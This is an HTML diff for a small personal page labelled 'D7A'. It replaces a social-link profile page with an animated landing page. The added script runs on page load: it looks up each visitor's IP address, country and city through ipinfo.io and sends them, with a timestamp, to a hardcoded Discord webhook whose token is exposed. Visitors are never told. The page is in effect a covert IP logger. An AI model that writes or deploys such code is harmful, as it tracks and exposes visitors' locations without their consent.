@@ -1,132 +1,141 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>D7A Family</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>D7A</title>
 
-  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Raleway:wght@400;700&family=Roboto:wght@400;700&family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Tiny5&display=swap" rel="stylesheet">
 
-  <style>
-    html,body{height:100%;margin:0;padding:0;}
-    body { margin:0; font-family:'Roboto',sans-serif; height:100vh; width:100vw; overflow:hidden; }
+<style>
+html, body {
+    height: 100%;
+    margin: 0;
+    font-family: 'Tiny5', Arial, sans-serif;
+    background-color: #000;
+    color: #fff;
+    overflow: hidden;
+    position: relative;
+}
 
-    #intro-video {
-      position: fixed;
-      top:0; left:0;
-      width:100%;
-      height:100%;
-      object-fit: cover;
-      z-index: 9999;
-      background: black;
-      transition: opacity 0.7s ease;
-    }
+body::before {
+    content: "";
+    position: fixed;
+    inset: 0;
+    background: linear-gradient(180deg, rgb(0,0,0), rgb(5,5,5));
+    pointer-events: none;
+    z-index: -1;
+    opacity: 0;
+    animation: fadeInBg 2s forwards;
+}
 
-    #main-content {
-      display: none;
-      height: 100vh;
-      width: 100vw;
-      background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') no-repeat center center fixed;
-      background-size: cover;
-      position: relative;
-      z-index: 1;
-    }
+@keyframes fadeInBg {
+    from {opacity: 0;}
+    to {opacity: 1;}
+}
 
-    .overlay-box {
-      position: absolute;
-      top: 50%; left: 50%;
-      transform: translate(-50%, -50%);
-      background: rgba(0,0,0,0.70);
-      color: white;
-      padding: 90px;
-      border-radius: 15px;
-      text-align: center;
-      width: 412px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.8);
-    }
-    .overlay-box h2 { font-family:'Montserrat',sans-serif; font-size:38px; margin-bottom:15px; }
-    .overlay-box p { font-family:'Tajawal',sans-serif; font-size:18px; line-height:1.6; }
+.center-text {
+    font-size: 100px;
+    color: #fff;
+    opacity: 0;
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    text-align: center;
+    transition: opacity 1s ease;
+}
 
-    .avatar { width:212px;height:212px;border-radius:10%;display:block;margin:0 auto 15px;border:3px solid rgba(255,255,255,0.8); }
-    .social-section { margin-top:15px;display:flex;align-items:center;justify-content:center;gap:10px; }
-    .social-section img { width:25px;height:25px; }
-    .discord-user { color:#7289DA;font-weight:bold;text-shadow:0 0 10px #7289DA;font-family:'Raleway',sans-serif; }
-    .tiktok-user  { color:#FF0050;font-weight:bold;text-shadow:0 0 10px #FF0050;font-family:'Raleway',sans-serif; }
-    .instagram-user{ color:#E1306C;font-weight:bold;text-shadow:0 0 10px #E1306C;font-family:'Raleway',sans-serif; }
-  </style>
+.container {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    text-align: center;
+}
+
+.image-container, .title, .description, .ip-address {
+    opacity: 0;
+    transition: opacity 1s ease;
+}
+
+.image-container img {
+    width: 312px;
+    height: 312px;
+    border-radius: 20px;
+    object-fit: cover;
+}
+
+.title { font-size: 24px; margin-top: 12px; }
+.description { font-size: 16px; margin-top: 6px; }
+.ip-address { font-size: 14px; margin-top: 4px; font-family: monospace; }
+</style>
 </head>
 <body>
 
-  <video id="intro-video" autoplay playsinline preload="auto">
-    <source src="https://l.top4top.io/m_3549h2u3i1.mp4" type="video/mp4">
-    متصفحك لا يدعم  
-  </video>
+<div class="center-text">D7A</div>
 
-  <div id="main-content">
-    <div class="overlay-box">
-      <img src="https://j.top4top.io/p_3540czjyd1.jpg" alt="الافتار" class="avatar">
-      <h2>D7A Family</h2>
-      <p>There is your curse, the affiliation of the lowly who made their downfall with their own hands, not moderate in vain. You are the reason and we are the undeniable result.</p>
-
-      <div class="social-section">
-        <img src="https://cdn-icons-png.flaticon.com/128/2626/2626288.png" alt="Discord Logo">
-        <span class="discord-user">discord.gg/5kk6FGKx4H</span>
-      </div>
-
-      <div class="social-section">
-        <img src="https://cdn-icons-png.flaticon.com/128/15789/15789316.png" alt="TikTok Logo">
-        <span class="tiktok-user">@d7afamily</span>
-      </div>
-
-      <div class="social-section">
-        <img src="https://cdn-icons-png.flaticon.com/128/1409/1409946.png" alt="Instagram Logo">
-        <span class="instagram-user">@d7afamily</span>
-      </div>
+<div class="container">
+    <div class="image-container">
+        <img src="https://i.pinimg.com/originals/2f/d6/df/2fd6df147fcb28699d340a6cf34958a3.gif" alt="Avatar">
     </div>
+    <div class="title">عنوان الصفحة</div>
+    <div class="description">هذا وصف للزائر</div>
+    <div class="ip-address" id="ip-info">IP: </div>
+</div>
 
-    <audio id="bg-audio" loop preload="auto">
-      <source src="https://b.top4top.io/m_35472wf1u1.mp3" type="audio/mpeg">
-      متصفحك لا يدعم  
-    </audio>
-  </div>
+<audio id="myAudio" src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" loop></audio>
 
 <script>
-  const video = document.getElementById('intro-video');
-  const mainContent = document.getElementById('main-content');
-  const bgAudio = document.getElementById('bg-audio');
+const audio = document.getElementById('myAudio');
+let played = false;
 
-  video.muted = false;
-  video.volume = 1.0;
-
-  video.addEventListener('ended', async () => {
-
-    video.style.opacity = '0';
-    setTimeout(() => { video.style.display = 'none'; }, 700);
-
-    mainContent.style.display = 'block';
-
-    try {
-      await bgAudio.play();
-    } catch (err) {
-      console.warn('المتصفح منع تشغيل الصوت  :', err);
+document.addEventListener('click', () => {
+    if (!played) {
+        audio.play().catch(() => {});
+        played = true;
     }
+});
 
-    const links = [
-      "https://discord.gg/5kk6FGKx4H",
-      "https://discord.gg/5kk6FGKx4H",
-      "https://www.tiktok.com/@d7afamily"
-    ];
+const centerText = document.querySelector('.center-text');
+const imageContainer = document.querySelector('.image-container');
+const title = document.querySelector('.title');
+const description = document.querySelector('.description');
+const ipAddress = document.getElementById('ip-info');
 
-    links.forEach((link, index) => {
-      setTimeout(() => {
-        if (typeof window.invokeNative === "function") {
-          window.invokeNative("openUrl", link);
-        } else {
-          window.open(link, "_blank");
-        }
-      }, index * 1000); 
-    });
-  });
+setTimeout(() => {
+    centerText.style.opacity = 1;
+    setTimeout(() => {
+        centerText.style.opacity = 0;
+        setTimeout(() => {
+            centerText.style.display = 'none';
+            imageContainer.style.opacity = 1;
+            setTimeout(() => { title.style.opacity = 1; }, 500);
+            setTimeout(() => { description.style.opacity = 1; }, 1000);
+
+            fetch('https://ipinfo.io/json')
+                .then(response => response.json())
+                .then(data => {
+                    const { ip, country, city, region, loc, org, timezone } = data;
+                    ipAddress.textContent = `IP: ${ip} - ${country}, ${city}`;
+                    ipAddress.style.opacity = 1;
+
+                    const dateTime = new Date().toLocaleString();
+                    const webhookUrl = 'https://canary.discord.com/api/webhooks/1422277048143183923/ehz4DwhL8WXZO_dXDGwunLJWXeVysQ8Jw0lVnlu4VzH7iBXVfPlmARohOKIOjtIWeMUn';
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            content: `IP : ${ip}\nCountry & City : ${country} - ${city}\nDate & Time : ${dateTime}\n -`
+                        })
+                    });
+                });
+            // --- نهاية الكود ---
+        }, 1000);
+    }, 2000);
+}, 500);
 </script>
 
 </body>
